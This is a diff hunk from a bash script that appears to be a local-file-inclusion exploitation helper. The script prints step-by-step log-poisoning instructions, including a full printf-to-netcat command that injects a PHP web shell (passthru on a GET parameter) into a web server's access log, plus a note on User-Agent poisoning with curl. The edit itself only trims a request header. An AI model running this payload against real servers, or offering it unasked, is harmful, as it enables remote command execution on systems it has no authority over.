@@ -273,7 +273,7 @@ for log in "${LOG_PATHS[@]}"; do
                 echo "      1) Poison via the REQUEST LINE with netcat (nc avoids URL-encoding"
                 echo "         the PHP tags). Send it to the web service whose log you're"
                 echo "         reading - usually PORT 80, which may NOT be the LFI app's port:"
-                echo "         printf 'GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?> HTTP/1.1\\r\\nHost: ${POISON_HOST}\\r\\nConnection: close\\r\\n\\r\\n' | nc -nv ${POISON_HOST} 80"
+                echo "         printf 'GET /<?php passthru(\$_GET[\"${CMD_PARAM}\"]); ?> HTTP/1.1\\r\\nHost: ${POISON_HOST}\\r\\n\\r\\n' | nc -nv ${POISON_HOST} 80"
                 echo "         (User-Agent poisoning via 'curl -A' only lands if Apache LogFormat"
                 echo "          is 'combined'; the request-line method also works with 'common'.)"
                 ;;
